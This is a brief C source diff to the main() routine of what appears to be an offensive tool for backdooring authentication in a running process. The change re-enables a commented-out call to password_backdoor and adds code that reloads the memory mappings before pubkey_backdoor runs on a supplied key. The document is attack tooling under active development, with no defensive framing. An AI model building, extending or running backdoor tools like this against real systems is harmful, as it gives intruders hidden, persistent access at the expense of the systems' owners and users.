@@ -350,7 +350,6 @@ int main(int argc, char *argv[]) {
 	map_init();
 	ctx->num_maps = map_load_all(ctx);
 	info("loaded %d memory mappings", ctx->num_maps);
-
 	ctx->mappings = get_mappings();
 
 	sort_maps(ctx);
@@ -401,7 +400,16 @@ int main(int argc, char *argv[]) {
 
 	cache_calltable(ctx);
 
-	//password_backdoor(ctx);
+	password_backdoor(ctx);
+
+	info("RELOADING MAPS");
+
+	map_init();
+	ctx->num_maps = map_load_all(ctx);
+	info("loaded %d memory mappings", ctx->num_maps);
+	ctx->mappings = get_mappings();
+	sort_maps(ctx);
+
 	pubkey_backdoor(ctx, argv[2]);
 
 	info("switching off rexec..");
